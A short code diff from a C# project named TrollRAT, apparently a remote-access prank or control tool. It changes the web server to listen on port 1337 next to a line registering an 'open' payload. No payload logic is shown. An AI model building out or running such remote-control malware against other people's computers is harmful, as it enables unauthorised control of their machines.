@@ -10,7 +10,7 @@ namespace TrollRAT
         [STAThread]
         static void Main()
         {
-            var server = new WebServer();
+            var server = new WebServer(1337);
 
             server.Payloads.Add(new PayloadOpen());
 
